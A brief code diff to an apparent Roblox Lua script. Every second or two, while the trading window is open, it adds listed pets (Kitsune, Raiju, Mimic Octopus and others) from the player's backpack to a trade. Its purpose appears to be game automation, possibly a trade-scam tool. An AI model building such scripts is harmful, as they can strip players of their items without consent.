@@ -20,7 +20,7 @@ function equipticket()
 	end
 end
 function additem()
-	local listpet = {"Kitsune", "Dragonfly", "French", "Raiju","Red Fox",""} 
+	local listpet = {"Kitsune", "Dragonfly", "French", "Raiju","Red Fox","Mimic Octopus"} 
 	for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
 		for _, petName in ipairs(listpet) do
 			if string.find(v.Name, petName) then
@@ -33,7 +33,7 @@ function additem()
 		end
 	end
 end
-while wait(1) do
+while wait(2) do
 	pcall(function ()
 		if TradingUI.Enabled then
 		additem()
